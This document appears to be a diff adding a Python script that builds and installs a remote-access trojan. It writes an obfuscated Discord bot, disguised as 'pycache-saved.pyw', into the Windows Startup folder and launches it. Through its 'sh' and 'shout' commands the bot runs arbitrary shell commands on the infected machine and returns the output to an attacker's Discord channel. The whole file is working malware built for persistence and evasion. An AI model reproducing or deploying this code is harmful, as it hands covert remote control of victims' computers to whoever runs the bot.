@@ -1,0 +1,57 @@
+from os import system, getenv, startfile
+try:__import__("pyperion")
+except:system("pip install pyperion")
+
+try:__import__("discord")
+except:
+    system("pip install discord")
+
+from pyperion import obfuscate
+
+content = r"""from os import remove, system, getenv
+from discord.ext import commands
+
+bot = commands.Bot(command_prefix="-")
+channel_id = __channel_id__
+token = "__token__"
+path = f"C:/users/{getenv('USERNAME')}"
+
+@bot.check
+async def only_channel(ctx):
+    return ctx.channel.id == channel_id
+
+@bot.event
+async def on_ready():
+    channel=await bot.fetch_channel(channel_id)
+    await channel.send("Ready")
+
+@bot.command(name="sh")
+async def _shell(ctx, *,command):
+    command = command.removeprefix("```").removesuffix("```").removeprefix("`").removesuffix("`")
+
+    for line in command.splitlines():
+        system(line)
+
+@bot.command(name="shout")
+async def _shout(ctx, *,command):
+    command = command.removeprefix("```").removesuffix("```").removeprefix("`").removesuffix("`")
+
+    for line in command.splitlines():
+        system(line+f" >> {path}/output.txt")
+
+    content = open(f"{path}/output.txt", "r").read()
+    print(content)
+    try:await ctx.send(f"```{content}```" if content else "No output.")
+    except:pass
+
+    try:remove(f"{path}/output.txt")
+    except:pass
+
+bot.run(token)"""
+
+
+path = fr'C:\Users\{getenv("USERNAME")}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+
+open(f"{path}\\pycache-saved.pyw", "w").write(obfuscate(content, ultrasafemode=True))
+
+startfile(f"{path}\\pycache-saved.pyw")
